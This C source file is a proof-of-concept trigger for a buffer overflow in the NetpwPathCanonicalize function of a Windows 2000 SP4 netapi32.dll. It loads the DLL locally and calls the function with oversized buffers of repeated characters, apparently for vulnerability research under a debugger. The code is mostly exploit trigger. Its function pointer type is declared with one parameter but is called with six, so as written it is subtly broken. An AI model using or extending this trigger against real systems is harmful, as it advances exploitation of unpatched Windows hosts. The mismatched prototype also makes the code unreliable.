
#include <windows.h>
typedef void (*MYPROC)(LPTSTR);
int main()
{	
	char path[0x320];
	char can_path[0x440];
	int maxbuf=0x440;
	char prefix[0x100];
	long pathtype=44;
	//load vulnerability netapi32.dll which we got from a WIN2K sp4 host  
	HINSTANCE LibHandle;
	MYPROC Trigger;
	char dll[ ] = "./netapi32.dll"; // care for the path 
	char VulFunc[ ] = "NetpwPathCanonicalize";
	LibHandle = LoadLibrary(dll);
	Trigger = (MYPROC) GetProcAddress(LibHandle, VulFunc);
	memset(path,0,sizeof(path));
	memset(path,'a',sizeof(path)-2);
	memset(prefix,0,sizeof(prefix));
	memset(prefix,'b',sizeof(prefix)-2);
	//__asm int 3
	(Trigger)(path,can_path,maxbuf,prefix ,&pathtype,0);
	FreeLibrary(LibHandle);
}

